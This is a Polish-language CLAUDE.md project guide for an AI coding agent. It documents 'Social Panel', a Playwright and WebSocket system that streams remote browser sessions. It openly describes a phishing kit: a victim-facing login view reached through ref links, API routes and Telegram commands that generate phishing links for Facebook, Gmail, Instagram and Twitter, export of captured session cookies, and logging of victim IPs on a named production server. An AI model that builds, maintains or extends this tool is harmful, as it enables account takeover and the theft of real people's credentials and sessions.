# Social Panel — CLAUDE.md

## Co to jest

Self-hosted panel do zdalnego sterowania przeglądarkami (Playwright/Chromium) poprzez WebSocket. Każde "konto" to osobna sesja przeglądarki z własnym profilem. Panel służy do monitorowania i interakcji z tymi sesjami z poziomu przeglądarki admina.

**Serwer produkcyjny:** `146.19.125.128:8080`  
**Ścieżka na serwerze:** `/opt/social-panel`  
**Branch roboczy:** `claude/focused-fermat-dpezbh`

## Stack

- **Backend:** Node.js (ESM, `"type": "module"`), Fastify v5, `@fastify/websocket`, `@fastify/static`
- **Przeglądarka:** Playwright Chromium (jedna instancja per konto, persistent profile)
- **Auth:** scrypt hashed passwords, 64-bajtowe tokeny sesji w cookie `__sp_s`, per-IP + per-username rate limiting
- **Telegram bot:** long-polling, komendy dla admina
- **Brak frameworka frontend** — vanilla JS, brak bundlera

## Uruchomienie

```bash
npm start          # produkcja (ładuje .env)
npm run dev        # dev z --watch
```

Wymagany plik `.env` (przykład w `.env.example`):
```
HOST=0.0.0.0
PORT=8080
DATA_DIR=./data
TELEGRAM_BOT_TOKEN=...
TELEGRAM_CHAT_ID=...
TELEGRAM_ADMIN_ID=...   # numeryczne ID Telegrama admina — WYMAGANE
PUBLIC_HOST=146.19.125.128:8080
BROWSER_CHANNEL=chrome  # opcjonalne; "chrome" dla kont Google/Gmail
```

## Struktura plików

```
src/
  server.js          # Fastify entrypoint, rejestracja pluginów
  config.js          # env vars → obiekt config
  routes/
    panel.js         # wszystkie API routes + guardy HTML
  viewer.js          # WebSocket /api/accounts/:id/viewer (CDP screencast)
  browser.js         # zarządzanie sesjami Playwright (~850 linii)
  accounts.js        # CRUD accounts.json (DATA_DIR)
  userdb.js          # CRUD users.json, scrypt hash
  session.js         # tokeny sesji (in-memory Map, TTL 24h)
  pinGuard.js        # rate limiting per-IP + per-username
  telegram.js        # bot + long-poll listener
  gmail-stats.js     # scraping statystyk Gmail
  gmail-api.js       # OAuth2 Gmail API (opcjonalne)
  twofa.js           # helper 2FA (dokumentacja)
  geo.js             # geolokalizacja IP admina (język UI)

public/
  index.html         # panel admina (po zalogowaniu)
  login.html         # formularz logowania
  view.html          # widok ofiary (/account/login?ref=...)
  adduser.html       # formularz dodawania użytkownika
  app.js             # logika panelu admina
  viewer.js          # klasa SocialPanelViewer (WebSocket + CDP input)
  view.js            # logika widoku ofiary
  login.js           # logika logowania
  style.css          # Obsidian Control theme (dark, --accent: #3b82f6)
```

## Kluczowe API routes

| Metoda | Ścieżka | Auth | Opis |
|--------|---------|------|------|
| POST | `/api/auth` | — | Login (username+password) |
| POST | `/api/logout` | cookie | Logout |
| GET | `/api/accounts` | cookie | Lista kont |
| POST | `/api/accounts` | cookie | Dodaj konto + generuj link phishingowy |
| DELETE | `/api/accounts/:id` | cookie | Usuń konto |
| POST | `/api/accounts/:id/start` | cookie | Uruchom sesję |
| POST | `/api/accounts/:id/stop` | cookie | Zatrzymaj sesję |
| GET | `/api/accounts/:id/screenshot` | cookie | Zdjęcie ekranu (JPEG) |
| GET | `/api/accounts/:id/cookies` | cookie | Eksport cookies |
| WS | `/api/accounts/:id/viewer` | cookie lub ref | Live viewer |
| GET | `/account/login?ref=...` | ref | Widok ofiary |
| POST | `/api/account-by-ref/:ref/start` | ref | Start sesji dla ofiary |

## Viewer (WebSocket)

Plik `src/viewer.js` — CDP screencast przy ~15 FPS (`everyNthFrame:4`, JPEG quality 60).

**Protokół klient→serwer:**
- `{ t: 'resize', width, height, dpr }` — zmiana rozmiaru viewport
- `{ t: 'mouse', type, x, y, button, ... }` — zdarzenia myszy
- `{ t: 'key', type, key, code, ... }` — zdarzenia klawiatury

**Protokół serwer→klient:**
- `{ t: 'frame', data: '<base64 JPEG>' }` — klatka screencast

**Auth:** admin = cookie `__sp_s`, ofiara = `?ref=<token>` w URL

## Telegram bot

Komendy (tylko `TELEGRAM_ADMIN_ID`):
- `/adduser <login> <hasło>` — dodaj użytkownika panelu
- `/deluser <login>` — usuń użytkownika
- `/users` — lista użytkowników
- `/addaccount <imię> <platforma>` — utwórz konto phishingowe (platformy: facebook/fb, gmail/gm, instagram/ig, twitter/tw)

## Bezpieczeństwo

- Hasła: `crypto.scrypt` (N=16384, r=8, p=1) + `timingSafeEqual`
- Sessions: 64 random bytes, HttpOnly cookie, TTL 24h
- Rate limiting: per-IP + per-username (defeats X-Forwarded-For spoofing)
- CSP, X-Frame-Options: DENY, no-store na chronionych stronach
- `index: false` na static — żeby `/` nie serwowało index.html z pominięciem guardu

## Dane

- `DATA_DIR/accounts.json` — lista kont (id, label, startUrl, proxy, ref, victimIp...)
- `DATA_DIR/users.json` — użytkownicy panelu (username, hash, salt)
- `DATA_DIR/profiles/<id>/` — profil Chromium per konto (persistent)
- Idle reaper: sesja zatrzymana po 10 min braku aktywności

## Ważne uwagi

- **Fastify v5:** `reply.redirect('/login')` — BEZ kodu statusu jako pierwszego argumentu (zmiana vs v4)
- **Playwright:** `browser.newCdpSession()` zwraca CDPSession, nie Page
- Przy błędzie "Target closed" w CDP — zamknąć WS (socket.close(4409))
- `BROWSER_CHANNEL=chrome` wymagane dla kont Google (Chromium jest blokowany)
- Serwer NIE używa dotenv — zmienne muszą być w `.env` i odpalać przez `npm start` (który używa `--env-file=.env`)
